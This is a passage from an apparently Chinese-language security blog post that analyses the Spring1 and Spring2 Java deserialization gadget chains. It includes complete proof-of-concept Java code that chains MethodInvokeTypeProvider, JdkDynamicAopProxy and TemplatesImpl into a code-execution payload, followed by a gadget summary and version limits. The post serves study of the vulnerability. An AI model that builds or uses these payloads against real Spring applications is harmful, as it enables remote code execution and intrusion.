class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line">        <span class="comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">objects</span> <span class="operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="type">Field</span>  <span class="variable">field</span>   <span class="operator">=</span> clazz2.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(objects, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerializerUtil.objectFileSerialize(objects,fileName);</span><br><span class="line">        SerializerUtil.objectFileDeserialize(fileName);</span><br><span class="line"><span class="comment">//        SerializeUtil.writeObjectToFile(objects, fileName);</span></span><br><span class="line"><span class="comment">//        SerializeUtil.readFileObject(fileName);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+<h2 id="Spring2反序列化-–-Java版本有限制"><a href="#Spring2反序列化-–-Java版本有限制" class="headerlink" title="Spring2反序列化 – Java版本有限制"></a>Spring2反序列化 – Java版本有限制</h2><p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h4><p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 类是 Spring AOP 框架基于 JDK 动态代理的实现，同时其还实现了 AopProxy 接口。</p>
+<p>我们来看一下 invoke 方法，获取 AdvisedSupport 里的 TargetSource，并调用 <code>getTarget()</code> 方法返回其中的对象。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1627522830580.png"
+                      alt="img"
+                ></p>
+<p>调用 <code>AopUtils#invokeJoinpointUsingReflection()</code> 方法反射调用对象的 method 方法并返回。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1627522834769.png"
+                      alt="img"
+                ></p>
+<p>方法里就是简单的反射调用。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1627522838105.png"
+                      alt="img"
+                ></p>
+<p>由此我们可以看到 JdkDynamicAopProxy 这个 InvocationHandler 类可以出色的完成 TemplatesImpl 的对象调用，可以直接配合 Spring1 中的触发调用链。</p>
+<h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p>与 Spring1 类似，直接上代码：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring2</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Spring2.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">		<span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 实例化 AdvisedSupport</span></span><br><span class="line">		<span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">		as.setTarget(tmpl);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使用 AnnotationInvocationHandler 动态代理</span></span><br><span class="line">		Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">		constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl</span></span><br><span class="line">		<span class="comment">// 并且会调用 method.invoke(返回值,args)</span></span><br><span class="line">		<span class="comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span></span><br><span class="line">		<span class="comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span></span><br><span class="line">		Class&lt;?&gt;       clazz          = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">		aopConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="comment">// 使用 AdvisedSupport 实例化 JdkDynamicAopProxy</span></span><br><span class="line">		<span class="type">InvocationHandler</span> <span class="variable">aopProxy</span> <span class="operator">=</span> (InvocationHandler) aopConstructor.newInstance(as);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// JdkDynamicAopProxy 本身就是个 InvocationHandler</span></span><br><span class="line">		<span class="comment">// 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法</span></span><br><span class="line">		<span class="comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span></span><br><span class="line">		<span class="comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span></span><br><span class="line">		<span class="type">Type</span> <span class="variable">typeTemplateProxy</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span></span><br><span class="line">		HashMap&lt;String, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">		map2.put(<span class="string">&quot;getType&quot;</span>, typeTemplateProxy);</span><br><span class="line"></span><br><span class="line">		<span class="type">InvocationHandler</span> <span class="variable">newInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">		<span class="comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">		Class&lt;?&gt;       clazz2 = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">		cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line">		<span class="comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">objects</span> <span class="operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">		<span class="type">Field</span>  <span class="variable">field</span>   <span class="operator">=</span> clazz2.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">		field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		field.set(objects, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">		SerializeUtil.writeObjectToFile(objects, fileName);</span><br><span class="line">		SerializeUtil.readFileObject(fileName);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上就是 Spring2 链分析的全部内容了，如果理解了 Spring1，那看 Spring2 就很简单了，最后总结一下。</p>
+<ol>
+<li>利用说明：<ul>
+<li>使用 JdkDynamicAopProxy 替换 ObjectFactoryDelegatingInvocationHandler，并完成最终的调用链。</li>
+</ul>
+</li>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.springframework.aop.framework.JdkDynamicAopProxy#invoke()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</span><br><span class="line">    SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">	    AnnotationInvocationHandler.invoke()</span><br><span class="line">		    ReflectionUtils.invokeMethod()</span><br><span class="line">			    Templates(Proxy).newTransformer()</span><br><span class="line">				    JdkDynamicAopProxy.invoke()</span><br><span class="line">                        AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">						    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure></div>
+
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>spring-core : 4.1.4.RELEASE<br>spring-aop : 4.1.4.RELEASE<br>jdk 1.7(或低版本下的jdk1.8) 主要原因还是 AnnotationInvocationHandler  的问题，版本高了用不了</p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Spring 反序列化</li>
+        <li><strong>作者:</strong> Ko1sh1</li>
+        <li><strong>创建于
+                :</strong> 2022-03-05 15:44:17</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-05-30 21:31:43
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://ko1sh1.github.io/2022/03/05/blog_java spring反序列化链/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#java 反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2022/03/08/blog_Memshell%E5%86%85%E5%AD%98%E9%A9%AC/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">java 内存马学习</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2022/01/08/blog_php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">php原生类利用</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://ko1sh1-blog-comments.hf.space',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">Spring 反序列化</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Spring1反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-text">环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MethodInvokeTypeProvider"><span class="nav-text">MethodInvokeTypeProvider</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ObjectFactoryDelegatingInvocationHandler"><span class="nav-text">ObjectFactoryDelegatingInvocationHandler</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E2%80%93-Java%E7%89%88%E6%9C%AC%E6%9C%89%E9%99%90%E5%88%B6"><span class="nav-text">Spring2反序列化 – Java版本有限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JdkDynamicAopProxy"><span class="nav-text">JdkDynamicAopProxy</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0"><span class="nav-text">攻击构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 14 篇文章
+                    </span>
+                    
+                        <span>
+                            共 128.2k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
